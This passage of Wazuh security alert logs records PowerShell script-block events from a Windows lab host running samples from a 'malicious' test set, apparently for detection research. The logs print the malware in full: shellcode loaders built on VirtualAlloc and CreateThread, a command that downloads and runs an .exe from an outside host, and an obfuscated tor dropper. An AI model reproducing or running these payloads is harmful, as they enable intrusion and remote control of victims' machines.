,0x79,0xe5,0xee,0x9b,0xb4,0x15,0x47,0x74,0xe0,0xbe,0x3e,0x12,0x23,0x47,0xa7,0x99,0xc4,0x92,0x52,0x9d,0x4e,0x02,0x16,0x12,0x35,0x40,0xa8,0x2c,0x35,0x52,0x79,0xc5,0xbe,0xa4,0x7a,0x15,0x29,0x08,0x85,0xea,0x56,0x7e,0x00,0x65,0xcb,0xf4,0x80,0xe8,0x25,0x92,0x10,0x97,0x39,0xb7,0x8a,0x66,0xfa,0x18,0x1d,0xe2,0xf8,0xcc,0x9f,0xa2,0x96,0x12,0xca,0x40,0x30,0x7b,0xd0,0xb2,0x64,0x34,0x1b,0xef,0x0a,0xfa,0x23,0x69,0x95,0xf9,0xa0,0x5c,0x21,0x55,0x2a,0xd2,0x8d,0x5e,0x05,0x2a,0x79,0x5d,0x35,0xfb,0xd4,0x0a,0xa7,0x6d,0x51,0x28,0x38,0x44,0xe7,0x6d,0xb3,0x4b,0xb0,0xe8,0xfc,0xe7,0x56,0x99,0xfc,0x53,0x07,0xd0,0xb9,0x7f,0xab,0xba,0x12,0x17,0x9e,0x6d,0x3b,0xbc,0x1f,0x44,0xc0,0xae,0xe4,0x8c,0x09,0x7d,0x8d,0x94,0x00,0x06,0x1f,0xe6,0xf8,0x62,0xa0,0x4f,0x6b,0x43,0x2b,0x00,0xec,0x5c,0xfe,0xb5,0xf2,0xca,0xf1,0xff,0x51,0x5c,0x0d,0x2a,0x7d,0xf0,0x0e,0x2a,0x81,0x8e,0xd4,0xfb,0x18,0x07,0x79,0x61,0xe5,0x3f,0x89,0x96,0x1a,0x40,0xeb,0x46,0x95,0xd1,0x81,0xf0,0x7b,0x4e,0x3b,0x89,0x83;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Cg1=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Cg1.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Cg1,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: c754ca2c-ee00-4498-aee9-bad9925db646\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1513.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$O2av = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $O2av -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc5,0xd9,0x74,0x24,0xf4,0xbf,0xfb,0x2e,0xf0,0xb5,0x58,0x29,0xc9,0xb1,0x6e,0x83,0xe8,0xfc,0x31,0x78,0x16,0x03,0x78,0x16,0xe2,0x0e,0xd2,0x18,0x3c,0xf0,0x2b,0xd9,0x5f,0x79,0xce,0xe8,0x4d,0x1d,0x9a,0x59,0x42,0x56,0xce,0x51,0x29,0x3a,0xfb,0xe2,0x5f,0x92,0x0c,0x42,0xd5,0xc4,0x23,0x53,0xdb,0xc8,0xe8,0x97,0x7d,0xb4,0xf2,0xcb,0x5d,0x85,0x3c,0x1e,0x9f,0xc2,0x21,0xd1,0xcd,0x9b,0x2e,0x40,0xe2,0xa8,0x73,0x59,0x03,0x7e,0xf8,0xe1,0x7b,0xfb,0x3f,0x95,0x31,0x02,0x10,0x06,0x4d,0x4c,0x88,0x2c,0x09,0x6c,0xa9,0xe1,0x49,0x50,0xe0,0x8e,0xba,0x23,0xf3,0x46,0xf3,0xcc,0xc5,0xa6,0x58,0xf3,0xe9,0x2a,0xa0,0x34,0xcd,0xd4,0xd7,0x4e,0x2d,0x68,0xe0,0x95,0x4f,0xb6,0x65,0x0b,0xf7,0x3d,0xdd,0xef,0x09,0x91,0xb8,0x64,0x05,0x5e,0xce,0x22,0x0a,0x61,0x03,0x59,0x36,0xea,0xa2,0x8d,0xbe,0xa8,0x80,0x09,0x9a,0x6b,0xa8,0x08,0x46,0xdd,0xd5,0x4a,0x2e,0x82,0x73,0x01,0xdd,0xd7,0x02,0x48,0x8a,0x49,0x6e,0x06,0x4a,0xfe,0x07,0x8f,0x24,0x97,0x6e,0xa9,0xed,0x0f,0x3d,0x42,0x28,0xd7,0x42,0x79,0x05,0x28,0xeb,0xd6,0x31,0x81,0x42,0xb0,0x87,0x7b,0x12,0xe7,0x07,0x56,0x0f,0x84,0xac,0x68,0x19,0x1b,0x02,0xe1,0x9a,0xca,0xf5,0x9d,0x27,0xed,0xf5,0x5d,0x0b,0xbd,0x9d,0x0a,0x22,0xa2,0x98,0x4a,0xe1,0x37,0x6b,0xec,0x3b,0x15,0x26,0x66,0x3c,0xab,0x67,0xf2,0x6e,0x99,0x35,0xaa,0xdc,0x4d,0xd2,0xa7,0xb4,0x43,0x19,0xc7,0xe2,0x12,0x9b,0x5d,0x1d,0x7f,0x4c,0x22,0x2e,0x7f,0x8c,0xab,0xb1,0x15,0x88,0xfb,0x5b,0xf6,0xc6,0x93,0xee,0x4e,0x79,0xe5,0xee,0x9b,0xb4,0x15,0x47,0x74,0xe0,0xbe,0x3e,0x12,0x23,0x47,0xa7,0x99,0xc4,0x92,0x52,0x9d,0x4e,0x02,0x16,0x12,0x35,0x40,0xa8,0x2c,0x35,0x52,0x79,0xc5,0xbe,0xa4,0x7a,0x15,0x29,0x08,0x85,0xea,0x56,0x7e,0x00,0x65,0xcb,0xf4,0x80,0xe8,0x25,0x92,0x10,0x97,0x39,0xb7,0x8a,0x66,0xfa,0x18,0x1d,0xe2,0xf8,0xcc,0x9f,0xa2,0x96,0x12,0xca,0x40,0x30,0x7b,0xd0,0xb2,0x64,0x34,0x1b,0xef,0x0a,0xfa,0x23,0x69,0x95,0xf9,0xa0,0x5c,0x21,0x55,0x2a,0xd2,0x8d,0x5e,0x05,0x2a,0x79,0x5d,0x35,0xfb,0xd4,0x0a,0xa7,0x6d,0x51,0x28,0x38,0x44,0xe7,0x6d,0xb3,0x4b,0xb0,0xe8,0xfc,0xe7,0x56,0x99,0xfc,0x53,0x07,0xd0,0xb9,0x7f,0xab,0xba,0x12,0x17,0x9e,0x6d,0x3b,0xbc,0x1f,0x44,0xc0,0xae,0xe4,0x8c,0x09,0x7d,0x8d,0x94,0x00,0x06,0x1f,0xe6,0xf8,0x62,0xa0,0x4f,0x6b,0x43,0x2b,0x00,0xec,0x5c,0xfe,0xb5,0xf2,0xca,0xf1,0xff,0x51,0x5c,0x0d,0x2a,0x7d,0xf0,0x0e,0x2a,0x81,0x8e,0xd4,0xfb,0x18,0x07,0x79,0x61,0xe5,0x3f,0x89,0x96,0x1a,0x40,0xeb,0x46,0x95,0xd1,0x81,0xf0,0x7b,0x4e,0x3b,0x89,0x83;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Cg1=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Cg1.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Cg1,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"c754ca2c-ee00-4498-aee9-bad9925db646","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1513.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:49.396+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":35,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015629.580840","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:19.7937082Z","eventRecordID":"200917","processID":"5680","threadID":"11692","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x92,0xe8,0x3a,0x10,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x13,0x03,0x56,0x13,0x83,0xee,0x6e,0x0a,0xcf,0xec,0x66,0x49,0x30,0x0d,0x76,0x2e,0xb8,0xe8,0x47,0x6e,0xde,0x79,0xf7,0x5e,0x94,0x2c,0xfb,0x15,0xf8,0xc4,0x88,0x58,0xd5,0xeb,0x39,0xd6,0x03,0xc5,0xba,0x4b,0x77,0x44,0x38,0x96,0xa4,0xa6,0x01,0x59,0xb9,0xa7,0x46,0x84,0x30,0xf5,0x1f,0xc2,0xe7,0xea,0x14,0x9e,0x3b,0x80,0x66,0x0e,0x3c,0x75,0x3e,0x31,0x6d,0x28,0x35,0x68,0xad,0xca,0x9a,0x00,0xe4,0xd4,0xff,0x2d,0xbe,0x6f,0xcb,0xda,0x41,0xa6,0x02,0x22,0xed,0x87,0xab,0xd1,0xef,0xc0,0x0b,0x0a,0x9a,0x38,0x68,0xb7,0x9d,0xfe,0x13,0x63,0x2b,0xe5,0xb3,0xe0,0x8b,0xc1,0x42,0x24,0x4d,0x81,0x48,0x81,0x19,0xcd,0x4c,0x14,0xcd,0x65,0x68,0x9d,0xf0,0xa9,0xf9,0xe5,0xd6,0x6d,0xa2,0xbe,0x77,0x37,0x0e,0x10,0x87,0x27,0xf1,0xcd,0x2d,0x23,0x1f,0x19,0x5c,0x6e,0x77,0xee,0x6d,0x91,0x87,0x78,0xe5,0xe2,0xb5,0x27,0x5d,0x6d,0xf5,0xa0,0x7b,0x6a,0xfa,0x9a,0x3c,0xe4,0x05,0x25,0x3d,0x2c,0xc1,0x71,0x6d,0x46,0xe0,0xf9,0xe6,0x96,0x0d,0x2c,0x92,0x93,0x99,0xea,0x7f,0x06,0x95,0x9d,0x7d,0x36,0x07,0xcd,0x0b,0xd0,0x17,0xa1,0x5b,0x4d,0xd7,0x11,0x1c,0x3d,0xbf,0x7b,0x93,0x62,0xdf,0x83,0x79,0x0b,0x75,0x6c,0xd4,0x63,0xe1,0x15,0x7d,0xff,0x90,0xda,0xab,0x85,0x92,0x51,0x58,0x79,0x5c,0x92,0x15,0x69,0x08,0x52,0x60,0xd3,0x9e,0x6d,0x5e,0x7e,0x1e,0xf8,0x65,0x29,0x49,0x94,0x67,0x0c,0xbd,0x3b,0x97,0x7b,0xb6,0xf2,0x0d,0xc4,0xa0,0xfa,0xc1,0xc4,0x30,0xad,0x8b,0xc4,0x58,0x09,0xe8,0x96,0x7d,0x56,0x25,0x8b,0x2e,0xc3,0xc6,0xfa,0x83,0x44,0xaf,0x00,0xfa,0xa3,0x70,0xfa,0x29,0x32,0x4c,0x2d,0x17,0x40,0xbc,0xed;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 6ea304ba-c86c-4e2c-bc95-95e47dbf2e09\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1532.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x92,0xe8,0x3a,0x10,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x13,0x03,0x56,0x13,0x83,0xee,0x6e,0x0a,0xcf,0xec,0x66,0x49,0x30,0x0d,0x76,0x2e,0xb8,0xe8,0x47,0x6e,0xde,0x79,0xf7,0x5e,0x94,0x2c,0xfb,0x15,0xf8,0xc4,0x88,0x58,0xd5,0xeb,0x39,0xd6,0x03,0xc5,0xba,0x4b,0x77,0x44,0x38,0x96,0xa4,0xa6,0x01,0x59,0xb9,0xa7,0x46,0x84,0x30,0xf5,0x1f,0xc2,0xe7,0xea,0x14,0x9e,0x3b,0x80,0x66,0x0e,0x3c,0x75,0x3e,0x31,0x6d,0x28,0x35,0x68,0xad,0xca,0x9a,0x00,0xe4,0xd4,0xff,0x2d,0xbe,0x6f,0xcb,0xda,0x41,0xa6,0x02,0x22,0xed,0x87,0xab,0xd1,0xef,0xc0,0x0b,0x0a,0x9a,0x38,0x68,0xb7,0x9d,0xfe,0x13,0x63,0x2b,0xe5,0xb3,0xe0,0x8b,0xc1,0x42,0x24,0x4d,0x81,0x48,0x81,0x19,0xcd,0x4c,0x14,0xcd,0x65,0x68,0x9d,0xf0,0xa9,0xf9,0xe5,0xd6,0x6d,0xa2,0xbe,0x77,0x37,0x0e,0x10,0x87,0x27,0xf1,0xcd,0x2d,0x23,0x1f,0x19,0x5c,0x6e,0x77,0xee,0x6d,0x91,0x87,0x78,0xe5,0xe2,0xb5,0x27,0x5d,0x6d,0xf5,0xa0,0x7b,0x6a,0xfa,0x9a,0x3c,0xe4,0x05,0x25,0x3d,0x2c,0xc1,0x71,0x6d,0x46,0xe0,0xf9,0xe6,0x96,0x0d,0x2c,0x92,0x93,0x99,0xea,0x7f,0x06,0x95,0x9d,0x7d,0x36,0x07,0xcd,0x0b,0xd0,0x17,0xa1,0x5b,0x4d,0xd7,0x11,0x1c,0x3d,0xbf,0x7b,0x93,0x62,0xdf,0x83,0x79,0x0b,0x75,0x6c,0xd4,0x63,0xe1,0x15,0x7d,0xff,0x90,0xda,0xab,0x85,0x92,0x51,0x58,0x79,0x5c,0x92,0x15,0x69,0x08,0x52,0x60,0xd3,0x9e,0x6d,0x5e,0x7e,0x1e,0xf8,0x65,0x29,0x49,0x94,0x67,0x0c,0xbd,0x3b,0x97,0x7b,0xb6,0xf2,0x0d,0xc4,0xa0,0xfa,0xc1,0xc4,0x30,0xad,0x8b,0xc4,0x58,0x09,0xe8,0x96,0x7d,0x56,0x25,0x8b,0x2e,0xc3,0xc6,0xfa,0x83,0x44,0xaf,0x00,0xfa,0xa3,0x70,0xfa,0x29,0x32,0x4c,0x2d,0x17,0x40,0xbc,0xed;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"6ea304ba-c86c-4e2c-bc95-95e47dbf2e09","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1532.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:50.877+0000","rule":{"level":4,"description":"Powershell script querying system environment variables","id":"91816","mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]},"firedtimes":6,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015630.592150","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:20.6056361Z","eventRecordID":"200921","processID":"11180","threadID":"12148","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',\"$env:TEMP\\Pa_001.exe\");Start-Process (\"$env:TEMP\\Pa_001.exe\")\r\n\r\nScriptBlock ID: 24084903-e9a2-48ec-ac49-d6f3414bc7d6\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1579.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',\\\"$env:TEMP\\\\Pa_001.exe\\\");Start-Process (\\\"$env:TEMP\\\\Pa_001.exe\\\")","scriptBlockId":"24084903-e9a2-48ec-ac49-d6f3414bc7d6","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1579.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:54.359+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":36,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015634.594714","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:24.1195774Z","eventRecordID":"200934","processID":"10968","threadID":"11296","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$0ab = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $0ab -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4e,0x54,0x0b,0x20,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$8wer=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($8wer.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$8wer,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 79440788-f207-44b7-879c-a93e1d59ab74\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1602.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$0ab = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $0ab -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4e,0x54,0x0b,0x20,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$8wer=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($8wer.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$8wer,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"79440788-f207-44b7-879c-a93e1d59ab74","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1602.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:55.425+0000","rule":{"level":4,"description":"Powershell executing process discovery","id":"91815","mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]},"firedtimes":2,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015635.605718","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:24.9667656Z","eventRecordID":"200938","processID":"1020","threadID":"12004","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) -match $by){;'BrOZYLFVY';'ihznknftcRL';(Get-Process -id $pid).Kill();'eMBnBWC';'ClMCvnGz';};'kFqbERjcaK';'cZdefv';function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex \"nslookup -querytype=txt $ohd 8.8.8.8\") -match '\"') -replace '\"', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws = $xyu.NameSpace($bqvt).Items();'DVRZCMXn';'aVMuAymCDo';$xyu.NameSpace($ezpr).CopyHere($ws, 20);'NoYaTMgWV';'WczlafFHI';rd $bqvt;'AJc';'Rl';};'mwPV';'XYS';'bSRkM';'GFeZKeMy';'Vt';'blWvxEYdB';$ezpr = $env:APPDATA + '\\' + $by;'HTC';'zgOw';if (!(Test-Path $ezpr)){;'fAXKjau';'kEXx';$vpjq = New-Item -ItemType Directory -Force -Path $ezpr;'GWSbA';'vOvra';$vpjq.Attributes = \"Hidden\", \"System\", \"NotContentIndexed\";'amPCGy';'EKFM';};'sB';'RRiIYz';'bvcCeTeLW';'NcOTYolCIB';$vtzg=$ezpr+ '\\tor.exe';'RoqsuXE';'fQGBWGwt';$ot=$ezpr+ '\\polipo.exe';'HXKsRivf';'oynNceOnFxy';$bqvt=$ezpr+'\\'+$by+'.zip';'DJlrBBZS';'HlBZ';$ilua=New-Object System.Net.WebClient;'QDcpy';'QJxf';$xyu=New-Object -C Shell.Application;'xeSu';'BEJbU';'BtnJKUSm';'HuG';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'cxjBOmZvDk';'NInn';e 'i.vankin.de';'COYVXPD';'QLikWodWT';};'nlHScK';'tLVWu';'DGZInswj';'ieaqBnXXBL';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'Tga';'rUFQi';e 'gg.ibiz.cc';'LVSqds';'MkiSQLVJy';};'sFUMwRQj';'DZ';'db';'NmVXjZaO';$cvdz=$ezpr+'\\roaminglog';'LUPq';'gKQgLmYh';saps $vtzg -Ar \" --Log `\"notice file $cvdz`\"\" -wi Hidden;'PZxnCI';'soSyFSxz';do{sleep 